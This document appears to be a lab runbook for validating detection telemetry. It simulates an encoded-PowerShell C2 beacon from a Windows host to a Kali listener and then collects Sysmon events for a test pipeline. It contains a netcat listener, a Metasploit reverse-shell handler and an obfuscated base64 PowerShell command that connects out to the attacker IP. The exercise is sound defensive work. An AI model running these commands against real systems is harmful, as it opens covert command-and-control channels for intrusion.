# Chain 1: Execution to C2 Beacon Simulation
# Attacker: Kali Linux (192.168.126.128)
# Victim:   Windows BOBBY (192.168.126.1)
# Techniques: T1059.001 + T1071.001

# ============================================================
# STEP 1 — Kali: Start listener before running Windows attack
# ============================================================

# Start Netcat listener on port 4444
nc -lvnp 4444

# Alternative: Metasploit listener
# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 192.168.126.128; set LPORT 4444; run"

# ============================================================
# STEP 2 — Windows (PowerShell as Administrator):
# Run Atomic test that produces encoded PS + outbound connection
# ============================================================

# First confirm Kali is reachable
# Test-NetConnection -ComputerName 192.168.126.128 -Port 4444

# Run the simulation
# Invoke-AtomicTest T1059.001 -TestNumbers 17

# Or manually trigger encoded PS with outbound connection:
# powershell -EncodedCommand JABjACAAPQAgACIASAAiACsAImkiACsAImkiACsAImkiACsAInQiACsAImUiACsAImQiACsAImkiACsAImMiACsAImEiACsAImwiACsAIiBDACIAOwAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMAXQA6ADoAQwBvAG4AbgBlAGMAdAAoACIAMQA5ADIALgAxADYAOAAuADEAMgA2AC4AMQAyADgAIgAsADQANAA0ADQAKQA=

# ============================================================
# STEP 3 — Windows: Capture telemetry immediately after execution
# ============================================================

# $since = (Get-Date).AddMinutes(-5)
#
# Sysmon EID 1 (process creation)
# Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
#     Where-Object { $_.Id -eq 1 -and $_.TimeCreated -gt $since } |
#     Select-Object Id, TimeCreated,
#         @{N="Computer";E={$_.MachineName}},
#         @{N="Message";E={$_.Message}} |
#     ConvertTo-Json -Depth 5 |
#     Out-File "telemetry\raw\chain1_c2_beacon\sysmon_eid1.json" -Encoding UTF8
#
# Sysmon EID 3 (network connections)
# Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
#     Where-Object { $_.Id -eq 3 -and $_.TimeCreated -gt $since } |
#     Select-Object Id, TimeCreated,
#         @{N="Computer";E={$_.MachineName}},
#         @{N="Message";E={$_.Message}} |
#     ConvertTo-Json -Depth 5 |
#     Out-File "telemetry\raw\chain1_c2_beacon\sysmon_eid3.json" -Encoding UTF8

# ============================================================
# STEP 4 — Run pipeline validation
# ============================================================

# python Pipeline/run_pipeline.py \
#     --input-dir telemetry/raw/chain1_c2_beacon \
#     --output reports/validation/chain1_validation.json \
#     --window 60

# ============================================================
# STEP 5 — Run regression test
# ============================================================

# python Pipeline/replay_harness.py --test chain1_c2_beacon --verbose
